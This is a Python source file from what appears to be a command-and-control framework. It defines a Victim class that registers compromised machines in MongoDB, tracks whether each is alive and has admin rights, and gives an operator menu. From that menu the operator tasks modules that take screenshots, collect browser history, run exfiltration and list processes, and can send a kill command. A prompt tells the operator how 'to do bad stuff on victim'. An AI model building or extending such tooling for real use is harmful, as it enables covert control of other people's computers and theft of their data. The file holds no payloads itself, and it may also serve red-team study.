import datetime
import pdb
import random
import string
from lib.task import Task
from lib.module import Module
from termcolor import colored
import readline
import re
import os


class Victim:

	mongoclient = None
	victims = {}

	## Modules supported by various OS and their language support
	module_hash = {'Windows' : ['screenshot','browser_history','exfiltration','running_processes'], 'Linux': ['screenshot','exfiltration','running_processes']}
	language_supported = {'screenshot':['powershell','python'], 'browser_history': ['powershell','python'], 'exfiltration': ['powershell','python'], 'running_processes':['powershell','python']}

	databasename = os.environ['MONGODB_DATABASE']

	def __init__(self,victim_id,platform,os_version,admin,status = 'Alive',lastseen = datetime.datetime.now(),add_db = True):
		self.victim_id = victim_id
		self.platform = platform
		self.os_version = os_version
		self.admin = admin
		self.lastseen = lastseen
		self.status = status
		self.victims[self.victim_id] = self
		self.modules = self.module_hash[self.platform]
		self.tasks = {}
		## To prevent adding to db when we are running load_victims_from_db
		if add_db : self.add_victim_to_db()

	## Shows the various victim present in the db/connected with the server. maybe dead or alive.
	@classmethod
	def show_victims(cls):
		print(f"\nTo interact with a victim run {colored('use <victim_id>','cyan')}")
		print("")
		print("Victim IDs		Victim Status")
		print("----------		-------------")
		for victim in cls.victims:
			print(f"{victim}		{cls.victims[victim].status}")


	@classmethod
	## Shows victim help menu
	def display_victim_help_menu(cls):
		print('--------------------------------------')
		print('|          VICTIM HELP MENU           |')
		print('--------------------------------------')
		commands = {'info':'Shows current victim information.' , 'modules': 'Shows modules executable on current victim.', 'tasks':'Show the task issued to the current victim and if there is output','kill': 
		'Kill Victim', 'back': 'Go back to main menu.'}

		for command in commands.keys():
			print(colored(command,'cyan') + " - " + commands[command])

	## This will load the victim info present in DB, created from server.py and instanitate objects for them.
	@classmethod
	def load_victims_from_db(cls):

		mydb = cls.mongoclient[cls.databasename]
		victims = mydb["victims"]

		victim_list = victims.find()

		for victim in victim_list:
			if ('sample' not in victim) and (victim['victim_id'] not in Victim.victims.keys()):
				Victim(victim['victim_id'],victim['platform'],victim['os_version'],victim['admin'],victim['status'],victim['lastseen'],False)


	## Gets the last seen and status of the victim. If lastseen > 60secs, vicitim considered dead.
	def get_victim_health_status(self):
		time = datetime.datetime.now() - self.lastseen
		if time.total_seconds() > 60:
			self.status = 'Dead'
		print(f"{colored('Status','cyan')} - {self.status}")

		print("Seen "+str(time.total_seconds())+" secs ago.")

	## Called from main side, to update the last seen and status according to db
	def update_last_seen_status_from_db(self):
		mydb = self.mongoclient[self.databasename]
		victims = mydb["victims"]
		h = {'victim_id':self.victim_id}

		victim = victims.find_one(h)

		if victim:
			self.lastseen = victim['lastseen']
			self.status = victim['status']

	## Gets the various info of the victim. Trigerred by the info command.
	def get_victim_info(self):
		self.update_last_seen_status_from_db()
		print(f"{colored('ID','cyan')} - {self.victim_id} \n{colored('Platform','cyan')} - {self.platform} \n{colored('OS Version','cyan')} - {self.os_version} \n{colored('Admin Privileges','cyan')} - {self.admin} \n{colored('lastseen','cyan')} - {self.lastseen}")
		self.get_victim_health_status()

	def show_tasks(self):
		if not self.tasks:
			print(colored('No tasks to show','yellow'))
		for key in self.tasks.keys():
			task_obj = self.tasks[key]
			task_obj.update_task_from_db()
			print(f"{colored('Task ID','cyan')} - {task_obj.task_id} \n{colored('Command','cyan')} - {task_obj.command} \n{colored('Command Output','cyan')} - {task_obj.output} \n{colored('Issued','cyan')} - {task_obj.issued}")

	def get_module_language(self,module):
		## Does linux support powershell?
		if self.platform == 'Linux':
			return 'python'

		while True:
			print(colored("Modules are supported in powershell (Windows only) and python langauge. Press enter for default, python. Please select language",'cyan'))
			language = str(input())
			language = language.lower()

			if language in ['powershell','python']:
				if language in self.language_supported[module]:
					return language
				else:
					print(colored(f"Sorry {module} doesn't support {language}. Try the other langauge.",'yellow'))
			elif language in ['back','exit']:
				return False
			else:
				print(colored("Sorry not supported language",'yellow'))
				continue

	## Displays the victim menu
	def victim_menu(self):
		self.display_victim_help_menu()
		print(f"\nYou are now interacting with the victim. To do bad stuff on victim, you might want to run {colored('modules','cyan')} commands to see the modules you can run and then use it by running '{colored('use <module_name>','cyan')}'\n")
		while True:
			print(colored("Enter victim based commands.",'blue'))
			cmd = str(input())

			if cmd == 'info':
				self.get_victim_info()

			elif cmd == 'modules':
				print(self.modules)

			elif cmd ==  'tasks':
				self.show_tasks()
			elif cmd == 'back' or cmd == 'exit':
				print("Going back to main menu...")
				return

			elif cmd == 'help':
				self.display_victim_help_menu()
			elif cmd == 'kill':

				## Creates a task with the command kill
				task_id = ''.join(random.choices(string.ascii_lowercase +string.digits, k = 7))
				task = Task(victim_id = self.victim_id ,command = 'kill',language='python',options = {}, task_id = task_id)
				self.tasks[task.task_id] = task

			elif re.match(r'^use .*$',cmd):

				## Before trying to assign task, see if victim alive
				self.update_last_seen_status_from_db()
				if self.status == 'Dead':
					print(colored("Sorry victim dead, can't assign task",'yellow'))
					continue

				module = re.findall(r'^use (.*)$',cmd)[0]
				if module in self.modules:
					utility = 'collection'
					language = self.get_module_language(module)
					Module.show_options(module,utility)

					## Gets the paramters for a module which user might customize
					option_hash = Module.module_menu(module,utility)

					## In case user does not want to run module, option hash will be False else it will be a dictionary
					if option_hash != False:
						task_id = ''.join(random.choices(string.ascii_lowercase +string.digits, k = 7))
						task = Task(victim_id = self.victim_id ,command = module,language=language, options = option_hash, task_id = task_id)
						self.tasks[task.task_id] = task

				else:
					## TODO- add to logger
					print(colored('Not a valid module. See the supported modules by running the "modules" command','yellow'))
			else:
				print("Not supported")

	def add_victim_to_db(self):

		mydb = self.mongoclient[self.databasename]
		victims = mydb["victims"]

		h = {'victim_id' : self.victim_id, 'platform' : self.platform ,'os_version' : self.os_version, 'admin': self.admin, 'status': self.status, 'lastseen' : self.lastseen}
		victims.insert_one(h)



	## Checks if a victim id is present in the DB.
	def victim_present(self,myclient,victim_id):
		pass


	## Checks if the command issued is supported or not by the victim
	def is_command_supported(self,myclient,victim_id,cmd):
		pass


	## Updates last seen whenever a new request is seen from the victim
	def update_last_seen_status_to_db(self):
		time = datetime.datetime.now()

		self.lastseen = time

		## Update in DB too.. TODO - NEEDED?
		mydb = self.mongoclient[self.databasename]
		victims = mydb["victims"]
		h = {'victim_id':self.victim_id}
		victims.find_one_and_update(h,{ "$set": { "lastseen": time , "status": self.status} })


class WindowsVictim(Victim):
	pass


class LinuxVictim(Victim):
	pass


class MacVictim(Victim):
	pass